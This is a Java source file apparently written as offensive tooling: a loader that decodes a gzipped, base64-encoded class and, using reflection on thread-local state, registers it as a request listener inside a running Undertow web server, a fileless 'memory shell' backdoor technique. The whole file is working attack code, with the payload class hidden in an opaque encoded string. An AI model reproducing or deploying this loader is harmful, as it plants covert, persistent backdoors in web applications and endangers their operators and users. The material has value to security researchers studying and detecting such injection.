package com.example.undertow.loader;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Base64;
import java.util.Map;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 * <p>
 * Version test
 * spring-boot-starter-undertow
 * 2.7.15
 */
public class UndertowThreadLoader {
    public static String base64Str = "H4sIAAAAAAAAAJVYCXsT1xU9I8makTwELLBBQAhgFnmRlUBCwSwJNhAMslkEGEMTGMuDPUbWCGnkBdoG2rRN9y1daJrSJm3dvZC0woRAoRBolu77vidd/wBfvrjnjRYjWwHygea9ee8u5557330DL7z2zHkAd+N/XkzHe714H94v4wMKNnuxDB9UEJbxIQXNMrYIgQ97UYmPKPioFzPxMQWPyvi4jE94KPvJcjjxKaF1XMGnZTwmRD8j43EvPosTCj4n4/MKnvDiSXxBaH9RwZfEOKzgywq+ouCrCr7mxdfxDfH4phffwklh7ZSCp2Q87UWNgPdtfEcoZcTrafEYETJnvHgGZ4XDZ8XsnIzz4uW7Ci7IuCjjexLcPbrWpScl+MK9Wr8Wimnx7lDEShrx7pXcXWXEDWuNBGegZpcEV7PZpUuYHDbielu6r1NP7tA6Y7pQNqNabJeWNMR7btFl9RgpCcGwmewO6YNaXyKmh9JxerPMgdDO3CRspCw9rifXD+rR1gh9+pL6obSeslro2dBixmG9S8KigA1vMJTSk/0x3QpFsuP2rOz6fj1urRQQy6w8orFwtnT26lGLpiWDvxZu9lhWotiChMXjPAiZ0MYJgjQztUg9lTDjKXocj3CiflaSBhR9MNpDZNQq1yxLi/b0EX9KMGujTltGLNSqJUQG7Hi4NXVvqYic0T6y407qqXSMMbgHkoYlsulMJWm8+hZIkzApQgQH6c7Om10Yl1jrdgk/zjJnIbNGJUzJJWYdf0lzSKTFpTNrhewUFU9NqXoqN+KJtMVXXeuTUJkVMcxQy9gypbzCaj6korgLhpyEIIMIyoXsvrxwTaCkyZJYyjqHLEGsY28T7cX0OJlI2ZtNaSNmnwn/BL3clqglvRCAvb9+MKonLMOMr5TRy4Mp4zINduvWBkOPde3SYmkqLA9MTOKNqRvLtNnZK8FzQFhr0/porMyeF6NM6gdilA/ZTgWVBViMVMmjkbDmeiDNMS2VugmO8YYd+qCEudcJtJmRdLTH3h6jgiCjMe3wYQkVE/xJqCruGkOJfOeYNl54Ve0a0vqYjOfYwshCxOiOa1Za1PjaCZEI4TcWjLIqGss1Om/ETCej+gZD4JhVukk1CEsqGkFMl1RcwVUJC2+peahIgWU6qeiUq/g+nlfxAl6UsMQwG/ItsiFnrIGtoiumJ1MNxcaazbilD9LmS/gBT6eZNLqNuBYb60iLbq0h8YyVKGMVy7FCxQ+xX8U+7CfprJ72XHuZPI5yFT/Cj4lhfN3K+ImKn+JnEuQEs2DF4kVC2dRw00w1xFnTMn6u4hfC4y8FGc4BgzB+hV9Tgn2ugUedhRdiw5FDnUY8lOrhazAq4zcqfovfCZy/l/EHFX/En1R0g9uQMP11zjAPqIo/4y8ikX9V8Tf8XcU/8KKKwzjCQlPxMl5R8U/8S8W/8R8Jc25c6yr+i+eJbHdwh3lQNJO6N3DtSVhwo06dF5Yw76YNPZ/N4hZYRENR+fNoMrHjL8O5gZob3h0rs93ETj49BmpKHG+ZAtlONS1QsgO7aUuLUb+yRFus2ZMtuY257xOBcp3ObpLUu1p1q8ck8vtK3Dt7JyApdfKzFohhxuvtEZ4R72cqJawoAa/EbVyybV9f7UPMIjNRzki2Js0E62CIb5YZNgf0ZLMmTqIS5aHWDNGtZxU1th4tGRHUx6O6TU3F2N72dNwyBM1eGi68VBZxnlsmoECgxIV6vSihRXU7gRUTFiXcRh/FdZX3M+Ead3EkjWWBvU01/OiSOba0iG80t5ZI6HFuBW/pu2HszlUsM98ynMQx7sPjhmm4rnpyZX8z5+MviUkp3VobFSwY2c/bwB4RjLjiI2kmMyqKDfP42T2dXedN/HlFC+W/IhTOeVnwuYpvIY5sTCirPQ3pFCcOrObTbS9WYQ2falYA9+I+iBa2Fk1ZZcdiynm5dqUuA8cFOFultnqfawRljS6/y+fm5ALkxjJ/mU+x5x7+bXQ7l8mVst99/gms9Lsr5SWNil+5CvcwFvmVDLwZlPvUDCYdR4Vf8d1mK05uG8Ztw7SrPCxLw6OX6p9CxRn4HGiU/fJVuE755RFMbVSC1PdNc55DZQZVQY7TM5jR6PF7xLrfxfUOp29mhJt+D9+mdzj9Ct9mtA/D1XoKLlK0Dj2YgvvRaY/AUVzmeAwX7dFps9OJGXzOIpWzGf8c+HAHn3MRJOHLUU2mFtDOQlpZhHYspnwAOuposRa9lEkwEUeYhKNMwzFafIQ8n6DWRXJ7mSw/R4YF84fJ/b200UxrCu7kznpsgMz5GdreyFx5cRot2ERcPv5TbDPlXETyJMJoZcaCeBRt2MIsHaHeVnqV6WsFtvGn0ON8bKeGR2Qwl10xi2AH87uT8/vhGaVbRcYuGe0ydsvokLFHxl4ZHhbFq6ji6zXc3iTjzdI1lL2KKTIeGCV8R1YHEndE0TyYLxrcYxcZJlbbBjvmquxmAY+Uw+MR937OxCuM0sVxtxT2zRrB7Axu983J4I7j8LvPYSZzPDfS4fLNi3SU1UbCw6jKrc4Xq9XZ1borqBzBAlbuwgwWtdaPYHFb8CTrIOwLnLTxbKXffMYbUM7nJmLbTKbDzGcbc7eVKLdxdTs5jnDWTo2d/LPbjqSWGDeRcY35d1DCgSh5d9rzreiyfexmXYhDKdiuEPwFZBzwXUNlk82bR3w35IJ+iTSJoJdVuPCsEnauPouajtOobatlDHUdqx0nUBk8yzjrnLNPoz6DYPvw6Ms8EQ0nCyHdhSWFkOazBIAHaPVBzvZxfT9LWmPRRCnVhaWEtsb+X4cyytTDYOmy6TGsg0yVg/LzEUMfrS3lLw7T9rDMDjcb0Ew4XxMFkWARHJo9SvScJLMl4RHfnrQiItvG0clxci2Pad0IQq31nN15slAfXrsmeql00IY0NyuONKsX9qyfLIoacWMAg5Qe4irdEaRHfEHlHJ3jKCislloFaXe11rsyWDKMaW30d/cVqGLIAhB8OTCJBpZSZYwvk6uHOEtyr5+7KabNYjtI81gPFNJewZ234K02zGq8DQ/ZMKtzMB22rIB5tNBehdSxHG88AqMiTTLeztMk4x2Csoen4J02Ie+i93cX+vccW5tHyHfP06g4ZR+YsSMlev8jttZ7/g8SGDp4RBIAAA==";

    static {
        try {
            byte[] bytes = decompress(Base64.getDecoder().decode(base64Str));

            URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
            Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defMethod.setAccessible(true);
            Class cls = (Class) defMethod.invoke(urlClassLoader, bytes, 0, bytes.length);
            Object object = cls.newInstance();

            Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
            Object[] table = (Object[]) getFieldValue(threadLocals, "table");

            for (int i = 0; i < table.length; i++) {
                Object entry = table[i];
                if (entry == null)
                    continue;
                Object value = getFieldValue(entry, "value");
                if (value == null)
                    continue;

                try {
                    if (value.getClass().getName().equals("io.undertow.servlet.handlers.ServletRequestContext")) {
                        Class listenerInfoClass = Class.forName("io.undertow.servlet.api.ListenerInfo");
                        Object deployment = getFieldValue(value, "deployment");
                        Object applicationListeners = getFieldValue(deployment, "applicationListeners");
                        Object managedListener = Class.forName("io.undertow.servlet.core.ManagedListener").getConstructor(listenerInfoClass, Boolean.TYPE).newInstance(listenerInfoClass.getConstructor(Class.class).newInstance(object.getClass()), true);
                        applicationListeners.getClass().getDeclaredMethod("addListener", Class.forName("io.undertow.servlet.core.ManagedListener")).invoke(applicationListeners, managedListener);
                        break;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static byte[] decompress(byte[] compressedData) throws IOException {
        ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
        try (GZIPInputStream gzipInputStream = new GZIPInputStream(bais)) {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
